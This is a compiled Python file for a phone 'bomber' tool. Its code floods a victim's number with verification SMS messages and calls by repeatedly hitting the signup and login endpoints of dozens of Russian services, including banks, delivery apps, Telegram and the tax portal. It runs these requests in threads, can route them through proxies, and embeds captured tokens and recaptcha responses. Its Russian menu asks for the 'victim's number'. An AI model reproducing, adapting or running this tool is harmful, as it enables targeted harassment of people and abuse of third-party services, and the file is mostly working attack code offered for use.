a
    ���`�i  �                   @   s�   d dl Z d dlmZ d dlZd dlmZ d dlmZ d dlZd dl	m
Z
 d dlmZ g Zg Zg Zed�dd	�Zdd
d�Zd dd�Zd!dd�Zdd� Zd"eeeed�dd�ZG dd� d�Zdd� Zdd� Zdd� Zedkr�e�  dS )#�    N)�banner)�BeautifulSoup��
user_agent)�sleep)�Thread)�returnc                   C   s   dddddt � dd�S )N�XMLHttpRequest�
keep-alive�no-cache�gzip, deflate, br�1��X-Requested-With�
ConnectionZPragmazCache-Control�Accept-Encoding�
User-AgentZDNTr   � r   r   �main.py�default_headers   s    �r   c                 K   s8   z&t j| f|dd�|�dt� i�� W n   Y n0 d S �N�   )�headers�timeout�proxies)�requests�postr   ��linkr   �kwargsr   r   r   r      s    &r   c                 K   sB   z&t j| f|dd�|�dt� i�� W n t jjy<   Y n0 d S r   )r   �getr   �
exceptions�RequestExceptionr   r   r   r   r       s    &r    c                 K   sB   z&t j| f|dd�|�dt� i�� W n t jjy<   Y n0 d S r   )r   �putr   r!   r"   r   r   r   r   r#   %   s    &r#   c                 C   sH   dd� | D �}d} |D ]}| |7 } q| d d� dkrDd| dd �  S | S )Nc                 S   s   g | ]}|� � r|�qS r   )�isdigit)�.0�elemr   r   r   �
<listcomp>,   �    z phone_format.<locals>.<listcomp>� �   �8�7r   )�phone�	formattedr&   r   r   r   �phone_format+   s    
r/   �*)r-   �mask�mask_symbolr   c                 C   sH   d}|D ]:}||kr:|| d 7 }| t | �d d d � } q||7 }q|S )Nr)   r   r*   �����)�len)r-   r1   r2   Zformatted_phone�symbolr   r   r   �pformat4   s    
r6   c                   @   sl  e Zd Zedd�dd�Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)d*� Zd+d,� Zd-d.� Zd/d0� Zd1d2� Zd3d4� Zd5d6� Zd7d8� Zd9d:� Zd;d<� Z d=d>� Z!d?d@� Z"dAdB� Z#dCdD� Z$dEdF� Z%dGdH� Z&dIdJ� Z'dKdL� Z(dMdN� Z)dOdP� Z*dQdR� Z+dSdT� Z,dUdV� Z-dWdX� Z.dS )Y�BomberN)r-   r   c                 C   s�   t jj��  || _td�}d�tj|dd��| _	d�tj|dd��| _
d�tj|dd��| _t� | _t �� | _| j� d�| _ddddd	d
dd�| _d S )NZ=123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMr)   �   )�kz
@gmail.comr	   r
   r   r   z�Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36r   r   )r   ZpackagesZurllib3Zdisable_warningsr-   �list�join�random�choices�password�username�namer   r   �Session�s�email�android_headers)�selfr-   r@   r   r   r   �__init__@   s    
zBomber.__init__c                 C   s2   | j tv r.td| j ddd�| jd� td� q d S )NzVhttps://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/r   r*   )r-   Z	is_repeatZ
order_guid��paramsr   �<   �r-   �phones_in_spamr   r   r   �rE   r   r   r   �dnsL   s    
z
Bomber.dnsc                 C   sH   | j tv rDtd�D ]&}tddd| j  i| jd� td� qtd� q d S )Nr   z!https://api.tinkoff.ru/v1/sign_upr-   �+��datar   rI   �  �r-   rK   �ranger   r   r   �rE   �ir   r   r   �tinkoffQ   s
    

zBomber.tinkoffc                 C   s.   | j tv r*tdd| j i| jd� td� q d S )Nz=https://lenta.com/api/v1/authentication/requestValidationCoder-   ��jsonr   �x   rJ   rL   r   r   r   �lentaX   s    
zBomber.lentac                 C   s:   | j tv r6tddd| j � �ddd�| jd� td� q d S )	Nz+https://mobile-api.qiwi.com/oauth/authorizez,urn:qiwi:oauth:response-type:confirmation-idrN   z
android-qwZzAm4FKq9UnSe7id)Zresponse_typer?   Z	client_idZclient_secretrO   �   )r-   rK   r   rD   r   rL   r   r   r   �qiwi]   s    
"zBomber.qiwic                 C   s@   | j tv r<tddd| jddt| j d�ddd	�d
� td� q d S )Nz$https://zoloto585.ru/api/bcard/reg2/z
29.09.1981u   Москва�   Иванu   Иванович�+* (***) ***-**-**�mu   Иванов)Z	birthdateZcityrC   r@   Z
patronymicr-   ZsexZsurname�rX   i,  )r-   rK   r   rC   r6   r   rL   r   r   r   �goldb   s    
(zBomber.goldc                 C   sH   | j tv rDtd�D ]&}tddd| j  i| jd� td� qtd� q d S )Nr   z*https://my.telegram.org/auth/send_passwordr-   rN   rO   r[   rQ   rR   rT   r   r   r   �telegramg   s
    

zBomber.telegramc                 C   s2   | j tv r.tddd| j  i| jd� td� q d S )NzUhttps://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhonez
st.r.phonerN   rO   rI   rJ   rL   r   r   r   �ok_run   s    
zBomber.ok_ruc                 C   s0   | j tv r,tdd| j iddid� td� q d S )Nz*https://youla.ru/web-api/auth/request_coder-   zX-Youla-Jsonz,{"lvid": "7e72ad9f2ff7840427bd772c0b630c71"}rO   r[   �r-   rK   r   r   rL   r   r   r   �youlas   s    
zBomber.youlac                 C   s.   | j tv r*tdd| j i| jd� td� q d S )Nz-https://dodopizza.kz/api/sendconfirmationcodeZphoneNumberrO   rI   rJ   rL   r   r   r   �	dodopizzax   s    
zBomber.dodopizzac                 C   s6   | j tv r2tdd| j dd � i| jd� td� q d S )Nz)https://my.modulbank.ru/api/v2/auth/phoneZ	Cellphoner*   rW   rI   rJ   rL   r   r   r   �	modulbank}   s    
zBomber.modulbankc                 C   s.   | j tv r*tdd| j i| jd� td� q d S )NzLhttps://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code�msisdnrG   r   rJ   rL   r   r   r   �mtstv�   s    
zBomber.mtstvc                 C   sF   | j tv rBtd�D ]$}td| j � d�| jd� td� qtd� q d S )N�   z4https://www.citilink.ru/registration/confirm/phone/+�/�r   rI   rQ   rR   rT   r   r   r   �citylink�   s
    

zBomber.citylinkc                 C   s2   | j tv r.tddd| j  i| jd� td� q d S )Nz=https://eda.yandex.ru/api/v1/user/request_authentication_code�phone_numberrN   rW   rI   rJ   rL   r   r   r   �	yandexeda�   s    
zBomber.yandexedac                 C   s0   | j tv r,tdd| j  dd�d� td� q d S )Nz5https://site-api.mcdonalds.ru/api/v1/user/login/phonerN   a�  03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V)Znumberzg-recaptcha-responser`   rI   rd   rL   r   r   r   �	mcdonalds�   s    
zBomber.mcdonaldsc                 C   s4   | j tv r0td| j dd � dd�d� td� q d S )Nz https://rutaxi.ru/ajax_auth.htmlr*   �3)�l�c�rP   rQ   rd   rL   r   r   r   �rutaxi�   s    
zBomber.rutaxic                 C   s,   | j tv r(tdt| j d�d� td� q d S )NzAhttps://cash-u.com/main/rest/firstrequest/phone/confirmation/sendz* (***) ***-**-**:rt   rI   )r-   rK   r   r6   r   rL   r   r   r   �cash_u�   s    
zBomber.cash_uc                 C   s*   | j tv r&tdd| j id� td� q d S )Nz�https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfNr-   r`   �
   rd   rL   r   r   r   �sushibox�   s    
zBomber.sushiboxc              	   C   sL   | j tv rHtd�D ]*}tdddddd| j  d�d	� td
� qtd� q d S )N�   z*https://api.papajohns.ru/user/confirm-code�ruz
web-mobiler   Zrecovery_passwordrN   )�lang�platformZcity_id�typer-   r`   �   rQ   �r-   rK   rS   r   r   rT   r   r   r   �papajons�   s
    

zBomber.papajonsc              	   C   s>   | j tv r:tdd ddt| j d�| j| jd�d� td� q d S )Nz https://pizzabox.ru/?action=auth�REGISTER�PHONEr^   )�CSRF�ACTIONZMODEr�   �PASSWORD�	PASSWORD2rt   rI   )r-   rK   r   r6   r>   r   rL   r   r   r   �
pizzaboxru�   s    
&zBomber.pizzaboxruc                 C   s*   | j tv r&tdd| j id� td� q d S )Na,  https://my.drom.ru/sign/recover?return=https%3A%2F%2Fchelyabinsk.drom.ru%2Fauto%2Fall%2F%3Futm_source%3Dyandexdirect%26utm_medium%3Dcpc%26utm_campaign%3Ddrom_74_chelyabinsk_auto-rivals_alldevice_search_handmade%26utm_content%3Ddesktop_search_text_main%26utm_term%3D%25D0%25B0%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D1%2583%2520%25D1%2587%25D0%25B5%25D0%25BB%25D1%258F%25D0%25B1%25D0%25B8%25D0%25BD%25D1%2581%25D0%25BA%26_openstat%3DZGlyZWN0LnlhbmRleC5ydTsxNzY3NTA4MzsxOTMxNzMyNzE4O3lhbmRleC5ydTpwcmVtaXVt%26yclid%3D7777444668347802164%26tcb%3D1609147011�signrt   rI   rd   rL   r   r   r   �dromru�   s    
zBomber.dromruc              
   C   sF   | j tv rBtddddddddd	�d
| j dd � d�d� td� q d S )Nz-https://moappsmapi.sportmaster.ru/api/v1/codeZ2dd9bfcfe18c2262z3.60.5(21555)ZANDROIDzSamsung SM-A205FN�9zmobileapp-android-9Z
Production)zX-SM-MobileAppzApp-VersionZOSzDevice-Modelz
OS-Versionr   z
Build-Moder-   r*   )r}   �value�r   rX   �   rd   rL   r   r   r   �sportmaster�   s    
.zBomber.sportmasterc                 C   sN   | j tv rJtd�D ],}dt| j d� d }td|d� td� qtd� q d S )	Nr   zrequest={"Body":{"Phone":"z+* *** ***-**-**a�  "},"Head":{"AdvertisingId":"3c725030-70c6-4945-8f75-69d1a5291793","AppsFlyerId":"1612665578706-4330044335349244143","AuthToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Client":"android_9_4.35.3","DeviceId":"3c725030-70c6-4945-8f75-69d1a5291793","MarketingPartnerKey":"mp30-5332b7f24ba54351047601d78f90dafbfd7fcc295f966d3af19aeb","SessionToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Store":"utk","Theme":"dark","Username":"","Password":""}}z-https://www.utkonos.ru/api/v1/SendSmsAuthCode)rH   rI   rQ   )r-   rK   rS   r6   r    r   )rE   rU   Zpayloadr   r   r   �utkonos�   s    

zBomber.utkonosc                 C   sT   t d�D ]F}tdddd| j dd�d� td	� td
dd| j id� td	� qd S )Nr   z,https://rollserv.ru/user/NewUser/?async=json�2r]   rN   Zon)r}   z	ext[2][1]zuser[cellphone]zuser[i_agree]rt   rI   z$https://rollserv.ru/user/RestorePwd/�login)rS   r   r-   r   rT   r   r   r   �rollserv�   s
    zBomber.rollservc                 C   s*   | j tv r&tdd| j id� td� q d S )Nz5https://lkdr.nalog.ru/api/v1/auth/challenge/sms/startr-   r`   rI   rd   rL   r   r   r   �nalog_ru�   s    
zBomber.nalog_ruc                 C   sv   | j tv rrzP| jjddd| j  i| j�d�jddddd	d
dddddddddddd�d� W n   Y n0 td� q d S )Nz2https://app.sberfood.ru/api/mobile/v3/auth/sendSmsZ	userPhonerN   z)https://app.sberfood.ru/auth?redirect=%2Fzapp.sberfood.rur
   Z28zhttps://app.sberfood.ruZWebz$Afisha, SplitOrder, ReferralCampaignzru-RU��Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36zapplication/json;charset=UTF-8z!application/json, text/plain, */*z[object Object]z$6480ef6e-896e-4f59-8144-f3c14c87f88dz'WebApp-3a2605b0cf2a4c9d938752a84b7e97b6r   r   )ZHostr   zContent-LengthZOriginZAppPlatformZFeatureszAccept-Languager   �Content-TypeZAccept�TokenZuseridZmridZAppKeyZ
AppVersionZRefererr   �rX   �cookiesr   rY   )r-   rK   rB   r   r    r�   r   rL   r   r   r   �	sber_vkus�   s    
PzBomber.sber_vkusc                 C   sr   | j tv rnzLt| j�d�jd��d�d d }| jjdt| j d�|d�|d	d
�d� W n   Y n0 t	d� q d S )Nzhttps://broniboy.ru/moscow/zhtml.parserzmeta[name=csrf-token]r   �contentz!https://broniboy.ru/ajax/send-smsr^   )r-   Z_csrfr	   )zX-CSRF-Tokenr   rO   r   )
r-   rK   �BsrB   r    r�   Zselectr   r6   r   )rE   �tokenr   r   r   �broniboy�   s    
"*zBomber.broniboyc                 C   sz   | j tv rvzT| jjd| jd� | jjdd d| jjd d| j dd � | j| j| jd�| jd	� W n   Y n0 t	d
� q d S )Nzhttps://anti-sushi.ru/rl   zhttps://anti-sushi.ru/?authr�   ZSIDr]   r*   )r�   r�   rA   �NAMEr�   ZEMAILr�   r�   rO   r~   )
r-   rK   rB   r    r   r   r�   rC   r>   r   rL   r   r   r   �
anti_sushi�   s    
BzBomber.anti_sushic                 C   s2   | j tv r.tdddi| j dd�d� td� q d S )Nz3https://bmp.megafon.tv/api/v10/auth/register/msisdnZ	SessionIDz+cj1lWg0n2IdD_gB-BPeZPejNflGdKzMjfWF1s9uldDQZ	123123112�rh   r>   )r�   rX   rI   rd   rL   r   r   r   �
megafon_tv�   s    
zBomber.megafon_tvc              	   C   s<   | j tv r8tdddd�d| j dddd	�id
� td� q d S )Nz2https://loyalty-api.dixy.ru//api/v1/users/registerZ�eyJhcHBfdmVyc2lvbiI6IjIuMi4yKzMyMCIsImRldmljZSI6ImFuZHJvaWQiLCJkZXZpY2VfaWQiOiIyZGQ5YmZjZmUxOGMyMjYyIiwib3NfdmVyc2lvbiI6InNkazoyOCJ9Z�7b2f81beb3bc53c95ea7074b9be34b14ca1cb9e0aad355d9be3defb7df54072a64f172051582b9276db166c18c4f410ca21ca603f04e3765c971f590fb7b0c5d)Zappinfozdixy-api-token�user�androidZEnLcVjUZitTr   )r-   r|   Zsms_hashZloyalty_region_idr�   rI   rd   rL   r   r   r   �dixy�   s    
$zBomber.dixyc                 C   s6   | j tv r2tdddd�d| j � d�d� td� q d S )	Nzhttps://api.zakazaka.ru/v1/r�   �0application/x-www-form-urlencoded; charset=UTF-8)r   r�   z}coord=56.02573402362801,36.78194995969534&app_version=android_395&device_id=16151140943779c51dc826104748b2e40f41410314&phone=z&action=profile.sms)r   rP   rI   rd   rL   r   r   r   �
deliverycl�   s    
zBomber.deliveryclc                 C   s\   | j tv rXz6| jjd| jd� | jjdd| j i| jj| jd� W n   Y n0 td� q d S )Nzhttps://b-apteka.ru/lk/loginrl   z(https://b-apteka.ru/lk/send_confirm_coder-   r�   rI   )r-   rK   rB   r    rD   r   r�   r   rL   r   r   r   �b_apteka�   s    
$zBomber.b_aptekac                 C   sT   t d�D ]F}tdddit| jd�ddd�d	d
dddddddd�	dd� td� qd S )N�   z"https://new-tel.net/ajax/a_api.phpr}   Zregz+* (***) ***-****u   Хочу номерa�  03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz)Zphone_nbrn   r�   z.application/json, text/javascript, */*; q=0.01r   zru,en;q=0.9Z494r�   zhttps://new-tel.netz)https://new-tel.net/uslugi/call-password/r�   r	   )	Zacceptzaccept-encodingzaccept-languagezcontent-lengthzcontent-type�originZrefererz
user-agentzx-requested-withF)rH   rP   r   Zverifyr~   )rS   r   r6   r-   r   rT   r   r   r   �new_tel  s    :zBomber.new_telc                 C   s8   | j tv r4td�D ]}tdd| j id� td� qq d S )Nr   z4https://api.sunlight.net/v3/customers/authorization/r-   r`   rI   r   rT   r   r   r   �sunlight  s    
zBomber.sunlightc              	   C   s8   | j tv r4td| j dddddd�| jd� td	� q d S )
Nz5https://www.icq.com/smsreg/requestPhoneValidation.php�enrz   r   Zic1rtwz1s1Hj1O0rZ46763)rh   �localeZcountryCode�versionr9   �rrO   r~   rJ   rL   r   r   r   �icq  s    
 z
Bomber.icqc                 C   s*   | j tv r&tdd| j id� td� q d S )Nz1https://api.iconjob.co/api/auth/verification_coder-   r`   rI   rd   rL   r   r   r   �	vk_rabota  s    
zBomber.vk_rabotac                 C   sH   | j tv rDz"td| j dd�t�d�jd� W n   Y n0 td� q d S )Nz3https://bmp.tv.yota.ru/api/v10/auth/register/msisdnZ123456r�   zhttps://tv.yota.ru/)rX   r�   rI   )r-   rK   r   r   r    r�   r   rL   r   r   r   �yota  s    


�
zBomber.yotac                 C   s0   | j tv r,tdd| j d�| jd� td� q d S )Nz$https://app.karusel.ru/api/v2/token/a�  03AGdBq27nU1tBT9kfCFtNRuu69Z2HZexs3nqTS1fxAScFvTOHs9XaEQujTEo8O6Wo1W3_QdxyFNl0BEpJue4sXqmoYVFM0EHSQTrdhtvb1exHUnEFMVwJRmP81DzNocYfMq4_qGSfB-ZI-2dz8EewhLnE_fps6ve2liRq5s8Gi_xFzFaU96vmJLp_AyIpcHLHYj2VUPK2R3Edw9k7-sTGj6tn1-Mf3zmeiViREVTYflibQUtQllEsTZnWTJtFFbeu83BNSZB4igHCDU3CtO-usjj-VQLEJaZf-lSKWE7I_c7S9atUy8tq2LbKczfHiOh2INJE6_wD0ILRTOsXWTK1JUVEAtzoZJ5hOo6LsAK98bEE7Cgsz5a-3-84eAHN7gs_pIEeadfimQ4apEu0MY--P_YCYcMU0bm__LFrFoYXEJfnBqjSgkOGUa7vnQJUBRmJkKqdbFzHim6PD4hciKP2AK3rFhGsWqhQuQ)Zrecaptcha_tokenr-   rW   r~   rJ   rL   r   r   r   �karusel"  s    
��zBomber.karuselc                 C   s*   t ddd| jd| jdddd�| jd� d S )	NzHhttps://www.wildberries.ru/mobile/requestconfirmcode?forAction=EasyLogin�truer)   z%https%3A%2F%2Fwww.wildberries.ru%2FlkZfalserz   )z phoneInput.AgreeToReceiveSmsSpamzphoneInput.ConfirmCodezphoneInput.FullPhoneMobileZ	returnUrlZphonemobileZagreeToReceiveSmsZshortSessionZperiodrO   )r   r-   r   rL   r   r   r   �wilberis)  s    zBomber.wilberisc                 C   sh   t dd| j dd�ddid� | jtv rdtd�D ](}t d	d| j d
d�| jd� td� q0td� qd S )Nz"https://b.utair.ru/api/v1/profile/rN   i0U�`)r-   ZconfirmationGDPRDateZauthorizationa�  Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyNzg0Iiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmVtZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyIsImFwcC5vcmRlcnMud2l0aGRyYXciLCJhcHAub3JkZXJzLnJlZnVuZCJdLCJleHAiOjE2NDU1ODQ1OTB9.a5uI-zyZVlXHU-bDr8rJ1UBGGjjaAHsSBw_YKg-cHMMrW   rw   z https://b.utair.ru/api/v1/login/Z	call_code)r�   Zconfirmation_typerI   ih  )r   r-   rK   rS   r   r   rT   r   r   r   �utair,  s    

zBomber.utairc                 C   sH   | j tv rDtd�D ]&}tddd| j d�| jd� td� qtd� q d S )	Nrj   zJhttps://goods.ru/api/mobile/v1/securityService/extraAuthentication/keySendz$5888d4f4-bac1-4d47-8957-f0c7e8ee9866r   )r�   �contextr-   rW   �Z   rQ   rR   rT   r   r   r   �goods4  s
    

zBomber.goodsc                 C   s2   | j | jg}|D ]}t|dd���  td� qd S )NF��target�daemonr~   )r�   r�   r   �startr   �rE   Zservices�functionr   r   r   �call;  s    zBomber.callc              &   C   s�   | j | j| j| j| j| j| j| j| j| j	| j
| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j | j!| j"| j#| j$| j%g&}|D ]}t&|dd��'�  t(d� q�d S )NFr�   r*   ))r�   r�   r�   r�   rM   rZ   rV   r\   ra   rc   rb   re   rf   ri   rg   ro   rm   ru   rp   rv   rx   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r�   r   r�   r   r   r   �rusA  s    �z
Bomber.rus)/�__name__�
__module__�__qualname__�strrF   rM   rV   rZ   r\   ra   rb   rc   re   rf   rg   ri   rm   ro   rp   ru   rv   rx   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r   r7   ?   sV   			
r7   c                  C   s,   i } t rt�t �| d< tr(t�t�| d< | S )NZHTTPZHTTPS)�httpr<   �choice�https)r   r   r   r   r   G  s    r   c                   C   s   t �t jdkrdnd� d S )N�nt�cls�clear)�os�systemr@   r   r   r   r   r�   P  s    r�   c                  C   st  t �  tt� td� td�} | �� �rT| dkrXt �  tt� td� td� t�  �qp| dkr�t �  tt� td� td� t�  �qp| dk�r�t �  tt� td	� td�} | �� �r�| d
kr�t �  t�  n�| dk�rDt �  tt� td� td�}|d
k�rt �  t�  n2t�d| � t �  tt� td� td� t�  nr| dk�r�t �  tt� td� td�}|d
k�r�t �  t�  n2t	�d| � t �  tt� td� td� t�  n$t �  tt� td� td� t�  �qp| dk�r6t �  tt� td� td�} | �� �r| dk�r�t �  tt� t
�r�t
D ]}td|� �� �q4td� td�}|d
k�rjt�  |�� �r�|t
v �r�t
�|� t �  tt� td� td� t�  n$t �  tt� td� td� t�  ntd� td� t�  �q4| dk�rxt �  tt� td� td� td�}|d
k�r0t�  nFt|�}tt|�jdd���  t
�|� td|� d�� td� t�  n�| dk�r�t �  tt� td � td�}|d
k�r�t�  nFt|�}tt|�jdd���  t
�|� td|� d�� td� t�  nt �  td� td� t�  nt �  td� td� t�  nt �  td� td� t�  nt �  td� td� t�  d S )!Nu\   

[1] Бомберы
[2] Меню прокси
[3] Информация
[4] Контактыr)   �4uw   Канал: t.me/CodeSafety
Чат: t.me/CodeSafetyChat
Основа: t.me/DishonorDev
Твинк: t.me/DishonorDevloperw   rq   u'   

 Приятного разьеба :)r�   uO   [1] http Прокси
[2] https прокси
[0] Вернуться в меню�0r   uc   Введите прокси в формате 192.168.1.1:8080
Для отмены введите 0zhttp://u-   Прокси успешно добавлен!�   zhttps://u   Я тебя не понялuA   [1] SMS Bomber
[2] Call Bomber
[3] Остановить спам u   Номер: uw   
Для остановки спама, введите номер телефона. Для отмены введите 0u=   Спам на номер успешно остановлен!r   u   Неверный номер!r�   u>   Не запущенно ни одной сесси спама!ur   Внимание! Данный бомбер работает только на Российские номера!
u0   Введите номер. Для отмены 0Fr�   u   Спам на номер u    начат.ui   Введите номер жертвы в любом формате. Для отмены введите 0)r�   �printr   �inputr$   r   �mainr�   �appendr�   rK   �remover/   r   r7   r�   r�   r�   )Ztask�proxyr-   Zslotr   r   r   r�   S  s   
�






















r�   �__main__)N)N)N)r0   )r�   r   r   Zbs4r   r�   rP   r   r<   �timer   �	threadingr   r�   r�   rK   �dictr   r   r    r#   r/   r�   r6   r7   r   r�   r�   r�   r   r   r   r   �<module>   s2   	


	  
	 